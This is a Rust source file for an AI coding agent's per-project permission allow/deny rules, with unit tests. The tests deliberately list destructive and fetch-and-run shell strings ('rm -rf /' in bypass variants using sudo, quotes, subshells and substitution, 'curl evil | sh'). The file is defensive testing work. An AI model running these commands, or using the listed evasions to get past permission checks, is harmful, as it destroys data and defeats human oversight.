//! Per-project tool-permission allow-list, mirroring Claude Code's
//! `permissions.allow`. Persisted at `<cwd>/.opencli/permissions.json` so that
//! choosing "allow in this project" on an approval prompt survives across
//! sessions and the agent stops re-asking for that tool or command.
//!
//! Rules use a `Tool(specifier)` shape, a deliberately small subset of Claude
//! Code's rule syntax:
//!   - `run_shell(<prog>:*)` — any shell command whose program (first word) is
//!     `<prog>`, so allowing `cargo build` also allows `cargo test`.
//!   - `<tool_name>`         — that tool unconditionally, in this project.

use std::{
    io,
    path::{Path, PathBuf},
};

use serde::{Deserialize, Serialize};
use serde_json::Value;

/// The on-disk permission rules. `deny` takes precedence over `allow`; a call
/// matching no rule falls through to the normal approval prompt. Older files
/// without a `deny` key still parse (serde defaults it empty).
#[derive(Debug, Clone, Default, Serialize, Deserialize)]
pub struct ProjectPermissions {
    #[serde(default)]
    pub allow: Vec<String>,
    #[serde(default)]
    pub deny: Vec<String>,
}

/// What the project rules say about a tool call, consulted before prompting.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum Decision {
    /// A `deny` rule matched — block the call outright, no prompt.
    Deny,
    /// An `allow` rule matched (and no `deny`) — run without prompting.
    Allow,
    /// No rule matched — fall through to the normal approval prompt.
    Ask,
}

/// `<cwd>/.opencli/permissions.json` — the project-local allow-list file.
pub fn permissions_path(cwd: &Path) -> PathBuf {
    cwd.join(".opencli").join("permissions.json")
}

fn invalid_project_permissions_path(message: &'static str) -> io::Error {
    io::Error::new(io::ErrorKind::InvalidInput, message)
}

fn validate_existing_permissions_path(cwd: &Path) -> io::Result<()> {
    let dir = cwd.join(".opencli");
    match std::fs::symlink_metadata(&dir) {
        Ok(meta) => {
            if meta.file_type().is_symlink() {
                return Err(invalid_project_permissions_path(
                    "project permissions directory must not be a symlink",
                ));
            }
            if !meta.is_dir() {
                return Err(invalid_project_permissions_path(
                    "project permissions path must be a directory",
                ));
            }
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => return Ok(()),
        Err(e) => return Err(e),
    }

    let path = permissions_path(cwd);
    match std::fs::symlink_metadata(&path) {
        Ok(meta) => {
            if meta.file_type().is_symlink() {
                return Err(invalid_project_permissions_path(
                    "project permissions file must not be a symlink",
                ));
            }
            if !meta.is_file() {
                return Err(invalid_project_permissions_path(
                    "project permissions path must be a file",
                ));
            }
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => {}
        Err(e) => return Err(e),
    }

    Ok(())
}

fn ensure_project_permissions_dir(cwd: &Path) -> io::Result<()> {
    let dir = cwd.join(".opencli");
    match std::fs::symlink_metadata(&dir) {
        Ok(meta) => {
            if meta.file_type().is_symlink() {
                return Err(invalid_project_permissions_path(
                    "project permissions directory must not be a symlink",
                ));
            }
            if !meta.is_dir() {
                return Err(invalid_project_permissions_path(
                    "project permissions path must be a directory",
                ));
            }
        }
        Err(e) if e.kind() == io::ErrorKind::NotFound => {
            std::fs::create_dir_all(&dir)?;
        }
        Err(e) => return Err(e),
    }

    let meta = std::fs::symlink_metadata(&dir)?;
    if meta.file_type().is_symlink() {
        return Err(invalid_project_permissions_path(
            "project permissions directory must not be a symlink",
        ));
    }
    if !meta.is_dir() {
        return Err(invalid_project_permissions_path(
            "project permissions path must be a directory",
        ));
    }
    Ok(())
}

fn write_permissions_file(path: &Path, text: &str) -> io::Result<()> {
    #[cfg(unix)]
    {
        use std::io::Write;
        use std::os::unix::fs::OpenOptionsExt;

        let mut file = std::fs::OpenOptions::new()
            .create(true)
            .truncate(true)
            .write(true)
            .mode(0o600)
            .custom_flags(libc::O_NOFOLLOW)
            .open(path)?;
        file.write_all(text.as_bytes())?;
        file.sync_all()
    }

    #[cfg(not(unix))]
    {
        std::fs::write(path, text)
    }
}

/// Load the project allow-list, treating a missing or malformed file as empty
/// so a bad edit never blocks the agent (it just falls back to prompting).
pub fn load(cwd: &Path) -> ProjectPermissions {
    if validate_existing_permissions_path(cwd).is_err() {
        return ProjectPermissions::default();
    }
    match std::fs::read_to_string(permissions_path(cwd)) {
        Ok(text) => serde_json::from_str(&text).unwrap_or_default(),
        Err(_) => ProjectPermissions::default(),
    }
}

/// The allow-rule that "allow in this project" should persist for a tool call.
pub fn rule_for(tool_name: &str, args: &Value) -> String {
    if tool_name == "run_shell" {
        if let Some(prog) = shell_program(args) {
            return format!("run_shell({prog}:*)");
        }
    }
    tool_name.to_string()
}

/// Human-readable description of what granting a rule covers, for the modal
/// option label (e.g. "all `cargo` commands").
pub fn rule_label(tool_name: &str, args: &Value) -> String {
    if tool_name == "run_shell" {
        if let Some(prog) = shell_program(args) {
            return format!("all `{prog}` commands");
        }
    }
    format!("all `{tool_name}` calls")
}

/// Program name of a shell command: the first whitespace-delimited word with
/// any leading path stripped, so `/usr/bin/git` and `git` share one rule. Used
/// only to NAME the persisted rule; matching uses [`shell_program_segments`].
fn shell_program(args: &Value) -> Option<String> {
    let cmd = args
        .get("command")
        .or_else(|| args.get("cmd"))
        .and_then(|v| v.as_str())?;
    let first = cmd.split_whitespace().next()?;
    let prog = first.rsplit('/').next().unwrap_or(first);
    (!prog.is_empty()).then(|| prog.to_string())
}

/// Which list a rule is being matched against — `run_shell` matching is
/// deliberately asymmetric (see [`run_shell_rule_matches`]).
#[derive(Clone, Copy, PartialEq, Eq)]
enum MatchMode {
    Allow,
    Deny,
}

/// Split a shell command on its control operators (`;`, `&&`, `||`, `|`, `&`,
/// newline) into non-empty segments. Splitting on the single chars `&`/`|` turns
/// `&&`/`||` into empty fragments, which are filtered out.
///
/// This is a best-effort token scan, NOT a shell parser: command substitution
/// (`$(…)`, backticks, `<(…)`) and `eval`/`sh -c '…'` payloads are not parsed.
/// Matching compensates asymmetrically (deny is broad, allow is narrow) so the
/// gaps degrade to a prompt, never to a silent auto-run.
fn shell_segments(cmd: &str) -> Vec<&str> {
    cmd.split([';', '|', '&', '\n'])
        .map(str::trim)
        .filter(|s| !s.is_empty())
        .collect()
}

/// Program name of a shell word: quote chars removed, then the basename, so
/// `"rm"`, `r''m`, `/bin/rm`, `'sudo'` all resolve to the program that actually
/// runs. Mirrors the danger classifier's `shell_token_command_name` so the deny
/// list and the danger gate agree on what a word executes.
fn program_name(word: &str) -> String {
    let literal: String = word.chars().filter(|c| !matches!(c, '"' | '\'')).collect();
    literal.rsplit(['/', '\\']).next().unwrap_or("").to_string()
}

/// Program candidates one segment runs, peeling wrapper/interpreter prefixes:
/// `sudo rm` → `["sudo", "rm"]`, `cargo build` → `["cargo"]`. Skips leading
/// `VAR=val` assignments and a peeled wrapper's immediate `-flags`. The chain
/// ends at the first non-wrapper program.
fn segment_programs(segment: &str) -> Vec<&str> {
    let mut words = segment.split_whitespace().peekable();
    while words.peek().is_some_and(|w| is_assignment(w)) {
        words.next();
    }
    let mut out = Vec::new();
    while let Some(w) = words.next() {
        let base = w.rsplit('/').next().unwrap_or(w);
        if base.is_empty() {
            continue;
        }
        out.push(base);
        if is_wrapper(base) {
            while words.peek().is_some_and(|n| n.starts_with('-')) {
                words.next();
            }
            continue; // keep peeling to reach the wrapped program
        }
        break;
    }
    out
}

/// Program candidates one segment runs for a DENY match — intentionally broad.
/// Beyond the leading program it treats every later non-flag word as a
/// candidate *once a wrapper has been seen*, because the wrapped program can sit
/// behind a value-bearing flag (`sudo -u root rm`) or a positional argument
/// (`timeout 5 rm`) that `segment_programs` mistakes for the program. Quotes are
/// stripped via [`program_name`] so `"rm"`/`r''m` are caught too. A bare denied
/// name passed as an argument to a wrapper (`sudo grep rm f`) may over-match,
/// but deny erring broad only ever costs an extra prompt, never a silent run.
fn segment_deny_programs(segment: &str) -> Vec<String> {
    let mut words = segment.split_whitespace().peekable();
    while words.peek().is_some_and(|w| is_assignment(w)) {
        words.next();
    }
    let mut out = Vec::new();
    let mut saw_wrapper = false;
    for w in words {
        if w.starts_with('-') {
            continue; // a flag, or a flag's value we can't see — skip
        }
        let base = program_name(w);
        if base.is_empty() {
            continue;
        }
        let wrap = is_wrapper(&base);
        out.push(base);
        if wrap {
            saw_wrapper = true;
        } else if !saw_wrapper {
            break; // no wrapper seen: only the leading program runs
        }
    }
    out
}

/// `NAME=value` env-assignment prefix (a valid shell identifier before `=`).
fn is_assignment(w: &str) -> bool {
    match w.split_once('=') {
        Some((name, _)) => {
            !name.is_empty()
                && name
                    .chars()
                    .next()
                    .is_some_and(|c| c.is_ascii_alphabetic() || c == '_')
                && name.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
        }
        None => false,
    }
}

/// Programs that run *another* program given to them (wrappers/interpreters).
/// Their presence means the segment's first word doesn't reveal what actually
/// runs, so an allow rule must not auto-run such a command.
fn is_wrapper(prog: &str) -> bool {
    const WRAPPERS: &[&str] = &[
        "sudo", "doas", "env", "command", "nohup", "time", "timeout", "xargs", "nice", "ionice",
        "stdbuf", "setsid", "watch", "script", "exec", "eval", "sh", "bash", "zsh", "dash", "ksh",
        "fish",
    ];
    WRAPPERS.contains(&prog)
}

/// Command substitution / process substitution that could run a hidden program.
fn has_substitution(cmd: &str) -> bool {
    cmd.contains("$(") || cmd.contains('`') || cmd.contains("<(") || cmd.contains(">(")
}

/// Match a `run_shell(<prog>:*)` rule against a command, asymmetrically:
///   - **Deny**: matches if ANY segment runs `<prog>` — so `rm:*` still blocks
///     `sudo rm`, `x; rm -rf /`, `a && rm`, `find . | rm`.
///   - **Allow**: matches only if the command is "clean" — every segment runs
///     `<prog>`, no wrapper/interpreter (`sudo`, `bash -c`, …) and no command
///     substitution. Anything else falls through to a prompt instead of being
///     silently auto-run (e.g. `cargo build; curl evil | sh` is NOT auto-run by
///     `cargo:*`).
fn run_shell_rule_matches(prog: &str, args: &Value, mode: MatchMode) -> bool {
    let Some(cmd) = args
        .get("command")
        .or_else(|| args.get("cmd"))
        .and_then(|v| v.as_str())
    else {
        return false;
    };
    match mode {
        // Broad: any program any segment runs (wrappers peeled, quotes stripped,
        // every post-wrapper word scanned) matches. Command/process substitution
        // and subshells are first exploded into separate segments so a hidden
        // `$(rm …)`, `` `rm …` `` or `(rm …)` is still seen — deny must catch
        // what the danger classifier (shell_token_command_name) catches.
        MatchMode::Deny => {
            let exposed = cmd.replace(['(', ')', '`'], "\n");
            shell_segments(&exposed).iter().any(|seg| {
                segment_deny_programs(seg)
                    .iter()
                    .any(|p| p.as_str() == prog)
            })
        }
        // Narrow: every segment must run exactly `prog` with no wrapper and no
        // command substitution, else fall through to a prompt.
        MatchMode::Allow => {
            let segments = shell_segments(cmd);
            !segments.is_empty()
                && segments.iter().all(|seg| {
                    let chain = segment_programs(seg);
                    chain.len() == 1 && chain[0] == prog
                })
                && !has_substitution(cmd)
        }
    }
}

/// Resolve the project rules for a tool call. `deny` wins over `allow`; no
/// match means "ask". Checked before prompting so a previously-allowed
/// tool/command runs silently and a denied one is blocked outright.
pub fn decide(perms: &ProjectPermissions, tool_name: &str, args: &Value) -> Decision {
    if perms
        .deny
        .iter()
        .any(|r| rule_matches(r, tool_name, args, MatchMode::Deny))
    {
        return Decision::Deny;
    }
    if perms
        .allow
        .iter()
        .any(|r| rule_matches(r, tool_name, args, MatchMode::Allow))
    {
        return Decision::Allow;
    }
    Decision::Ask
}

/// Convenience wrapper kept for call sites that only care about the allow case.
pub fn is_allowed(perms: &ProjectPermissions, tool_name: &str, args: &Value) -> bool {
    matches!(decide(perms, tool_name, args), Decision::Allow)
}

/// Whether a stored rule matches a tool call. A rule is either a bare tool name
/// (`write_file` — any call of that tool) or `tool(spec)`:
///   - `run_shell(<prog>:*)` — shell command whose program is `<prog>`.
///   - `<file_tool>(<glob>)` — path argument matching the glob (`src/**`,
///     `*.rs`, `**/*.test.ts`, `.git/**`).
fn rule_matches(rule: &str, tool_name: &str, args: &Value, mode: MatchMode) -> bool {
    let (rule_tool, spec) = match rule.split_once('(') {
        Some((t, rest)) => (t.trim(), rest.strip_suffix(')').unwrap_or(rest)),
        None => (rule.trim(), ""),
    };
    if rule_tool != tool_name {
        return false;
    }
    if spec.is_empty() {
        return true; // bare tool name: any call of this tool
    }
    if tool_name == "run_shell" {
        let prog = spec.strip_suffix(":*").unwrap_or(spec);
        return run_shell_rule_matches(prog, args, mode);
    }
    // File tools: the spec is a glob over the path argument as accepted by the
    // target tool. Keep this in sync with the runtime aliases so permission
    // rules don't silently miss camelCase/provider-shaped calls. The path is
    // lexically normalized first so a `deny(.git/**)` isn't slipped past by
    // `./.git/config`, `.git//config`, or `.git/x/../config`.
    match path_argument(tool_name, args) {
        Some(path) => glob_match(spec, &normalize_rule_path(path)),
        None => false,
    }
}

/// Lexically normalize a path argument for glob matching: drop `./` and empty
/// (`//`) segments and resolve `..` without touching disk (the target may not
/// exist yet). A `..` that would climb above the start is kept literal, so an
/// escaping path like `../secret` can't normalize into an in-tree `secret` and
/// thereby match a clean relative rule. An absolute path stays absolute.
///
/// Note: a relative rule (`.git/**`) still won't match an *absolute* argument
/// (`/home/u/proj/.git/config`); writes are separately confined to the project
/// by `tools::fs::resolve`, and rules meant for absolute paths must be written
/// in absolute form.
fn normalize_rule_path(path: &str) -> String {
    let absolute = path.starts_with('/');
    let mut out: Vec<&str> = Vec::new();
    for seg in path.split('/') {
        match seg {
            "" | "." => continue,
            ".." => {
                if matches!(out.last(), Some(&s) if s != "..") {
                    out.pop();
                } else {
                    out.push("..");
                }
            }
            s => out.push(s),
        }
    }
    let joined = out.join("/");
    if absolute {
        format!("/{joined}")
    } else {
        joined
    }
}

fn path_argument<'a>(tool_name: &str, args: &'a Value) -> Option<&'a str> {
    let obj = args.as_object()?;
    let keys: &[&str] = match tool_name {
        "read_file" | "write_file" | "edit_file" | "multi_edit" | "list_dir" => &[
            "path",
            "file_path",
            "filePath",
            "directory",
            "dir",
            "folder",
        ],
        "notebook_edit" => &[
            "notebook_path",
            "notebookPath",
            "path",
            "file_path",
            "filePath",
        ],
        _ => &["path"],
    };
    keys.iter().find_map(|key| obj.get(*key)?.as_str())
}

/// Minimal glob matcher for path rules. `*` matches any run of non-`/`
/// characters, `**` matches across `/` (any chars), `?` matches one non-`/`
/// char; everything else is literal. No brace/char-class support — not needed
/// for permission paths.
fn glob_match(pattern: &str, text: &str) -> bool {
    glob_inner(pattern.as_bytes(), text.as_bytes())
}

fn glob_inner(p: &[u8], t: &[u8]) -> bool {
    if p.is_empty() {
        return t.is_empty();
    }
    match p[0] {
        b'*' if p.get(1) == Some(&b'*') => {
            // `**` — match any chars including `/`.
            let rest = &p[2..];
            // `**/` may match zero leading dirs: allow eliding the slash so
            // `**/*.rs` also matches a root-level `main.rs`.
            if rest.first() == Some(&b'/') && glob_inner(&rest[1..], t) {
                return true;
            }
            (0..=t.len()).any(|i| glob_inner(rest, &t[i..]))
        }
        b'*' => {
            // single `*` — match a run of non-`/` chars (including empty).
            let rest = &p[1..];
            let mut i = 0;
            loop {
                if glob_inner(rest, &t[i..]) {
                    return true;
                }
                if i >= t.len() || t[i] == b'/' {
                    return false;
                }
                i += 1;
            }
        }
        b'?' => !t.is_empty() && t[0] != b'/' && glob_inner(&p[1..], &t[1..]),
        c => !t.is_empty() && t[0] == c && glob_inner(&p[1..], &t[1..]),
    }
}

/// Add a rule for this tool call to `<cwd>/.opencli/permissions.json`
/// (idempotent), creating the directory and file as needed. Returns the rule
/// that was recorded so the caller can report it.
pub fn allow_in_project(cwd: &Path, tool_name: &str, args: &Value) -> std::io::Result<String> {
    let rule = rule_for(tool_name, args);
    let mut perms = load(cwd);
    if !perms.allow.iter().any(|r| r == &rule) {
        perms.allow.push(rule.clone());
    }
    ensure_project_permissions_dir(cwd)?;
    validate_existing_permissions_path(cwd)?;
    let text = serde_json::to_string_pretty(&perms).unwrap_or_default();
    write_permissions_file(&permissions_path(cwd), &text)?;
    Ok(rule)
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn shell_rule_keys_on_program() {
        let args = json!({"command": "cargo build --release"});
        assert_eq!(rule_for("run_shell", &args), "run_shell(cargo:*)");
        let args_cmd = json!({"cmd": "cargo test"});
        assert_eq!(rule_for("run_shell", &args_cmd), "run_shell(cargo:*)");
        // Leading path is stripped so the rule matches the bare program too.
        let args2 = json!({"command": "/usr/bin/git status"});
        assert_eq!(rule_for("run_shell", &args2), "run_shell(git:*)");
    }

    #[test]
    fn non_shell_rule_is_the_tool_name() {
        assert_eq!(rule_for("write_file", &json!({"path": "a"})), "write_file");
    }

    #[test]
    fn is_allowed_matches_program_and_whole_tool_rules() {
        let perms = ProjectPermissions {
            allow: vec!["run_shell(cargo:*)".into(), "write_file".into()],
            deny: vec![],
        };
        // Same program, different args → allowed.
        assert!(is_allowed(
            &perms,
            "run_shell",
            &json!({"command": "cargo test"})
        ));
        assert!(is_allowed(
            &perms,
            "run_shell",
            &json!({"cmd": "cargo clippy"})
        ));
        // Different program → still prompts.
        assert!(!is_allowed(
            &perms,
            "run_shell",
            &json!({"command": "rm -rf /"})
        ));
        // Whole-tool rule covers any args.
        assert!(is_allowed(&perms, "write_file", &json!({"path": "x"})));
        // Tool with no rule → prompts.
        assert!(!is_allowed(&perms, "edit_file", &json!({"path": "x"})));
    }

    #[test]
    fn glob_matches_paths() {
        assert!(glob_match("src/**", "src/a/b.rs"));
        assert!(glob_match("src/**", "src/x.rs"));
        assert!(!glob_match("src/**", "tests/x.rs"));
        assert!(glob_match("*.rs", "main.rs"));
        // A single `*` does not cross a path separator.
        assert!(!glob_match("*.rs", "src/main.rs"));
        assert!(glob_match("**/*.rs", "src/a/main.rs"));
        assert!(glob_match("**/*.rs", "main.rs"));
        assert!(glob_match(".git/**", ".git/config"));
        assert!(glob_match("?.txt", "a.txt"));
        assert!(!glob_match("?.txt", "ab.txt"));
    }

    #[test]
    fn deny_run_shell_is_not_bypassed_by_chaining_or_wrappers() {
        let perms = ProjectPermissions {
            allow: vec![],
            deny: vec!["run_shell(rm:*)".into()],
        };
        for cmd in [
            "rm -rf x",
            "sudo rm -rf /",
            "true; rm -rf /",
            "foo && rm -rf /",
            "find . -type f | rm",
            "FOO=1 rm -rf /",
            "echo hi & rm -rf /",
        ] {
            assert_eq!(
                decide(&perms, "run_shell", &json!({ "command": cmd })),
                Decision::Deny,
                "expected deny for: {cmd}"
            );
        }
    }

    #[test]
    fn deny_run_shell_is_not_bypassed_by_quotes_value_flags_or_substitution() {
        let perms = ProjectPermissions {
            allow: vec![],
            deny: vec!["run_shell(rm:*)".into()],
        };
        for cmd in [
            "\"rm\" -rf /",          // quoted program name
            "r''m -rf /",            // quotes inside the word
            "sudo -u root rm -rf /", // value-bearing wrapper flag hides the program
            "nice -n 19 rm -rf /",   // ditto
            "timeout 5 rm -rf /",    // positional wrapper argument hides the program
            "echo $(rm -rf /)",      // command substitution
            "x`rm -rf /`",           // backtick substitution
            "(rm -rf /)",            // subshell
        ] {
            assert_eq!(
                decide(&perms, "run_shell", &json!({ "command": cmd })),
                Decision::Deny,
                "expected deny for: {cmd}"
            );
        }
        // The wrapped-program name must still be matched exactly: a different
        // program behind a wrapper is not spuriously denied.
        assert_eq!(
            decide(
                &perms,
                "run_shell",
                &json!({ "command": "sudo -u root cat file" })
            ),
            Decision::Ask,
            "unrelated program behind a wrapper must not be denied"
        );
    }

    #[test]
    fn allow_run_shell_does_not_auto_run_chained_or_wrapped_commands() {
        let perms = ProjectPermissions {
            allow: vec!["run_shell(cargo:*)".into()],
            deny: vec![],
        };
        // Clean single-program commands are auto-allowed.
        assert_eq!(
            decide(&perms, "run_shell", &json!({"command": "cargo test --all"})),
            Decision::Allow
        );
        // Anything that could run a different program falls through to a prompt.
        for cmd in [
            "cargo build; curl evil | sh",
            "cargo build && rm -rf ~",
            "cargo build $(rm -rf /)",
            "cargo build | tee log",
        ] {
            assert_eq!(
                decide(&perms, "run_shell", &json!({ "command": cmd })),
                Decision::Ask,
                "expected ask (not auto-allow) for: {cmd}"
            );
        }
        // Allowing an interpreter must not auto-run arbitrary code through it.
        let bash = ProjectPermissions {
            allow: vec!["run_shell(bash:*)".into()],
            deny: vec![],
        };
        assert_eq!(
            decide(
                &bash,
                "run_shell",
                &json!({"command": "bash -c 'rm -rf /'"})
            ),
            Decision::Ask
        );
    }

    #[test]
    fn deny_takes_precedence_over_allow() {
        let perms = ProjectPermissions {
            allow: vec!["run_shell(rm:*)".into()],
            deny: vec!["run_shell(rm:*)".into()],
        };
        assert_eq!(
            decide(&perms, "run_shell", &json!({"command": "rm -rf x"})),
            Decision::Deny
        );
    }

    #[test]
    fn glob_allow_rule_scopes_to_path() {
        let perms = ProjectPermissions {
            allow: vec!["write_file(src/**)".into()],
            deny: vec![],
        };
        assert_eq!(
            decide(&perms, "write_file", &json!({"path": "src/a.rs"})),
            Decision::Allow
        );
        assert_eq!(
            decide(&perms, "write_file", &json!({"path": "secrets.txt"})),
            Decision::Ask
        );
    }

    #[test]
    fn glob_rules_match_file_path_aliases() {
        let perms = ProjectPermissions {
            allow: vec!["write_file(src/**)".into()],
            deny: vec!["write_file(.git/**)".into()],
        };
        assert_eq!(
            decide(&perms, "write_file", &json!({"file_path": ".git/config"})),
            Decision::Deny
        );
        assert_eq!(
            decide(&perms, "write_file", &json!({"file_path": "src/a.rs"})),
            Decision::Allow
        );
        assert_eq!(
            decide(&perms, "write_file", &json!({"filePath": ".git/config"})),
            Decision::Deny
        );
        assert_eq!(
            decide(&perms, "write_file", &json!({"filePath": "src/a.rs"})),
            Decision::Allow
        );
    }

    #[test]
    fn glob_rules_match_list_dir_aliases() {
        let perms = ProjectPermissions {
            allow: vec!["list_dir(src/**)".into()],
            deny: vec!["list_dir(.git/**)".into()],
        };
        assert_eq!(
            decide(&perms, "list_dir", &json!({"directory": ".git/config"})),
            Decision::Deny
        );
        assert_eq!(
            decide(&perms, "list_dir", &json!({"folder": "src/components"})),
            Decision::Allow
        );
    }

    #[test]
    fn glob_rules_match_notebook_path_aliases() {
        let perms = ProjectPermissions {
            allow: vec!["notebook_edit(notebooks/**)".into()],
            deny: vec!["notebook_edit(.git/**)".into()],
        };
        assert_eq!(
            decide(
                &perms,
                "notebook_edit",
                &json!({"notebook_path": ".git/config"})
            ),
            Decision::Deny
        );
        assert_eq!(
            decide(
                &perms,
                "notebook_edit",
                &json!({"notebook_path": "notebooks/demo.ipynb"})
            ),
            Decision::Allow
        );
        assert_eq!(
            decide(
                &perms,
                "notebook_edit",
                &json!({"path": "notebooks/demo.ipynb"})
            ),
            Decision::Allow
        );
        assert_eq!(
            decide(
                &perms,
                "notebook_edit",
                &json!({"notebookPath": ".git/config"})
            ),
            Decision::Deny
        );
        assert_eq!(
            decide(
                &perms,
                "notebook_edit",
                &json!({"notebookPath": "notebooks/demo.ipynb"})
            ),
            Decision::Allow
        );
    }

    #[test]
    fn deny_glob_is_not_bypassed_by_path_spelling() {
        let perms = ProjectPermissions {
            allow: vec![],
            deny: vec!["write_file(.git/**)".into()],
        };
        for p in [
            ".git/config",
            "./.git/config",
            ".git//config",
            ".git/x/../config",
        ] {
            assert_eq!(
                decide(&perms, "write_file", &json!({ "path": p })),
                Decision::Deny,
                "expected deny for spelling: {p}"
            );
        }
    }

    #[test]
    fn normalize_keeps_escaping_paths_from_matching_in_tree_rules() {
        // `../secret` must NOT normalize to `secret` and match a relative rule.
        assert_eq!(normalize_rule_path("../secret"), "../secret");
        assert_eq!(normalize_rule_path("./a//b/../c"), "a/c");
        assert_eq!(normalize_rule_path("/abs/./p"), "/abs/p");
        let perms = ProjectPermissions {
            allow: vec!["write_file(secret)".into()],
            deny: vec![],
        };
        assert_eq!(
            decide(&perms, "write_file", &json!({"path": "../secret"})),
            Decision::Ask
        );
    }

    #[test]
    fn deny_blocks_even_without_an_allow() {
        let perms = ProjectPermissions {
            allow: vec![],
            deny: vec!["write_file(.git/**)".into()],
        };
        assert_eq!(
            decide(&perms, "write_file", &json!({"path": ".git/config"})),
            Decision::Deny
        );
        assert_eq!(
            decide(&perms, "write_file", &json!({"path": "src/a.rs"})),
            Decision::Ask
        );
    }

    #[test]
    fn allow_in_project_persists_and_is_idempotent() {
        let tmp = std::env::temp_dir().join(format!("opencli-perm-test-{}", std::process::id()));
        let _ = std::fs::remove_dir_all(&tmp);
        std::fs::create_dir_all(&tmp).unwrap();
        let args = json!({"command": "cargo build"});
        let rule = allow_in_project(&tmp, "run_shell", &args).unwrap();
        assert_eq!(rule, "run_shell(cargo:*)");
        // Re-adding the same call does not duplicate the rule.
        allow_in_project(&tmp, "run_shell", &json!({"command": "cargo test"})).unwrap();
        let perms = load(&tmp);
        assert_eq!(perms.allow, vec!["run_shell(cargo:*)".to_string()]);
        assert!(is_allowed(
            &perms,
            "run_shell",
            &json!({"command": "cargo run"})
        ));
        let _ = std::fs::remove_dir_all(&tmp);
    }

    #[cfg(unix)]
    #[test]
    fn allow_in_project_rejects_symlinked_opencli_dir() {
        use std::os::unix::fs::symlink;

        let tmp =
            std::env::temp_dir().join(format!("opencli-perm-dir-link-{}", rand::random::<u64>()));
        let outside =
            std::env::temp_dir().join(format!("opencli-perm-dir-target-{}", rand::random::<u64>()));
        let _ = std::fs::remove_dir_all(&tmp);
        let _ = std::fs::remove_dir_all(&outside);
        std::fs::create_dir_all(&tmp).unwrap();
        std::fs::create_dir_all(&outside).unwrap();
        symlink(&outside, tmp.join(".opencli")).unwrap();

        let err = allow_in_project(&tmp, "run_shell", &json!({"command": "cargo build"}))
            .expect_err("symlinked project permission directory must be rejected");

        assert_eq!(err.kind(), std::io::ErrorKind::InvalidInput);
        assert!(
            !outside.join("permissions.json").exists(),
            "must not write permissions through a symlinked .opencli directory"
        );
        let _ = std::fs::remove_dir_all(&tmp);
        let _ = std::fs::remove_dir_all(&outside);
    }

    #[cfg(unix)]
    #[test]
    fn allow_in_project_rejects_symlinked_permissions_file() {
        use std::os::unix::fs::symlink;

        let tmp =
            std::env::temp_dir().join(format!("opencli-perm-file-link-{}", rand::random::<u64>()));
        let outside = std::env::temp_dir().join(format!(
            "opencli-perm-file-target-{}",
            rand::random::<u64>()
        ));
        let _ = std::fs::remove_dir_all(&tmp);
        let _ = std::fs::remove_file(&outside);
        std::fs::create_dir_all(tmp.join(".opencli")).unwrap();
        std::fs::write(&outside, "sentinel").unwrap();
        symlink(&outside, permissions_path(&tmp)).unwrap();

        let err = allow_in_project(&tmp, "run_shell", &json!({"command": "cargo build"}))
            .expect_err("symlinked project permissions file must be rejected");

        assert_eq!(err.kind(), std::io::ErrorKind::InvalidInput);
        assert_eq!(
            std::fs::read_to_string(&outside).unwrap(),
            "sentinel",
            "must not overwrite the symlink target"
        );
        let _ = std::fs::remove_dir_all(&tmp);
        let _ = std::fs::remove_file(&outside);
    }
}
